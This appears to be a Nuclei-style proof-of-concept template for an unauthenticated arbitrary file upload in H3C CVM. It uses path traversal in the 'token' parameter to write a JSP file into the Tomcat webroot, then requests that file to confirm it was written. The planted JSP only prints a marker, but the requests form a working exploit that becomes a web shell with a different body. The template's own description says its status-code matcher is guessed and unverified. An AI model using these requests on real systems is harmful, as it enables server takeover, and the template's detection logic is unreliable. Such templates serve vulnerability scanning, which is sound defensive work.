id: poc-6b50d217ed937ddba44d
info:
  name: H3CCVM前台任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc.jsp&name=222 HTTP/1.1

    Host: {{Hostname}}

    Content-Range: bytes 0-10/20

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Content-Length: 23


    <%out.print("99999");%>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /cas/js/lib/buttons/stc.jsp HTTP/1.1

    Host: {{Hostname}}

    Content-Range: bytes 0-10/20

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
